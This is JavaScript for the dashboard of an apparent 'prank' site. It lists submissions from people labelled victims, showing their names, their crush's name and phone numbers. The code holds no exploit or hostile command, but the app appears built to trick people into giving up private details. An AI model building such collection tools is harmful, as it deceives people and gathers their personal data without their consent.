const urlParams = new URLSearchParams(window.location.search);
let prankId = urlParams.get('id');

if (!prankId) {
    const pathParts = window.location.pathname.split('/');
    if (pathParts.length > 2 && pathParts[1] === 'dashboard') {
        prankId = pathParts[2];
    }
}

const submissionsBody = document.getElementById('submissions-body');
const creatorNameEl = document.getElementById('creator-name');
const noDataEl = document.getElementById('no-data');
const prankLinkEl = document.getElementById('prank-link');

if (!prankId) {
    alert("No Prank ID provided!");
    window.location.href = '/';
}

// Set Prank URL
const prankUrl = `${window.location.origin}/prank.html?id=${prankId}`;
prankLinkEl.textContent = prankUrl;

document.getElementById('copy-btn').onclick = () => {
    navigator.clipboard.writeText(prankUrl);
    alert('Copied link!');
};

// Fetch Data
fetch(`/api/dashboard/${prankId}`)
    .then(res => res.json())
    .then(data => {
        if (!data.success) {
            alert('Prank not found or server error');
            window.location.href = '/';
            return;
        }

        creatorNameEl.textContent = data.prank.creatorName;

        const submissions = data.submissions;
        if (submissions.length === 0) {
            noDataEl.classList.remove('hidden');
            document.getElementById('submissions-table').classList.add('hidden'); // Hide empty table header maybe?
            // Actually keeps header visible is fine, just body empty
        } else {
            submissions.forEach(sub => {
                const row = document.createElement('tr');

                const time = new Date(sub.createdAt).toLocaleString();

                row.innerHTML = `
                    <td>${escapeHtml(sub.victimName)}</td>
                    <td style="color: #ffcccc; font-weight: bold;">${escapeHtml(sub.crushName)}</td>
                    <td>${escapeHtml(sub.phoneNumber)}</td>
                    <td style="font-size: 0.8rem; color: #ccc;">${time}</td>
                `;
                submissionsBody.appendChild(row);
            });
        }
    })
    .catch(err => console.error(err));

function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
